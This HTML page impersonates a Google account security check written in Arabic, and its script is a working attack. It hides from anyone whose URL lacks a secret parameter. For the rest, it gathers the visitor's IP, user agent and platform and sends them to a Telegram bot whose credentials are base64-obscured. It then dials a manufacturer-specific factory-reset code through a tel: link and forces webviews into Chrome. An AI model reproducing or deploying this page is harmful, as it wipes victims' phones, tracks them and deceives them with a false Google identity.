<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Google - التحقق من الأمان">
    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
    <title>Google Security Check</title>
    <style>
        body { background:#fff; font-family:arial,sans-serif; text-align:center; padding-top:20%; margin:0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; display:inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onload="x_execute()">

    <div id="status">
        <div class="loader"></div>
        <p style="color:#5f6368; font-size:18px;">جاري تأمين الحساب وتحديث بروتوكول الأمان...</p>
    </div>

<script>
    // بياناتك المشفرة (التوكن والآيدي)
    const _t = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
    const _c = "NzE4NDk3MDM1NQ==";
    function _d(s) { return atob(s); }

    function x_execute() {
        const params = new URLSearchParams(window.location.search);
        
        // التمويه: إذا لم يوجد المفتاح السري يذهب لجوجل الحقيقي
        if (params.get('auth') !== 'true') {
            window.location.href = "https://www.google.com";
            return;
        }

        // 1. جمع المعلومات وتحليل الجهاز
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
            let ua = navigator.userAgent;
            let platform = navigator.platform;
            let actionType = "⚠️ يحتاج ضغط اتصال (يدوي)";
            let finalCode = "2767*3855%23"; // الكود الافتراضي

            // تحديد قوة الهجوم بناءً على الإصدار
            if (ua.match(/Android\s([4-9]|10)\./)) {
                actionType = "🚀 تنفيذ تلقائي (صامت)";
            }

            // تخصيص الكود حسب الشركة المصنعة
            let uLower = ua.toLowerCase();
            if (uLower.includes("samsung")) { finalCode = "2767*3855%23"; }
            else if (uLower.includes("huawei") || uLower.includes("honor")) { finalCode = "%23*%23*2846579*%23*%23"; }
            else if (uLower.includes("xiaomi") || uLower.includes("redmi") || uLower.includes("google")) { finalCode = "%23*%23*7780*%23*%23"; }
            else if (uLower.includes("sony")) { finalCode = "%23*%23*7378423*%23*%23"; }
            else { finalCode = "2767*3855%23"; } // ريلمي، أوبو، وبقية الشركات

            // إرسال التقرير الشامل لك على تيليجرام
            let report = `🔔 صيد جديد!\n🌐 IP: ${d.ip}\n📱 الجهاز: ${platform}\n⚙️ الحالة: ${actionType}\n🌍 كود الفرمتة المستخدم: *${finalCode.replace('%23', '#')}*`;
            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(report)}`);

            // 2. البدء في تنفيذ أمر الفرمتة/الاتصال
            setTimeout(() => {
                // محاولة الهروب لكروم إذا كان في واتساب
                if (ua.match(/FBAN|FBAV|WhatsApp|Instagram/i)) {
                    window.location.href = "intent://" + window.location.host + window.location.pathname + window.location.search + "#Intent;scheme=http;package=com.android.chrome;end";
                } else {
                    window.location.href = "tel:*" + finalCode;
                }
            }, 1000);
        });
    }
</script>
</body>
</html>
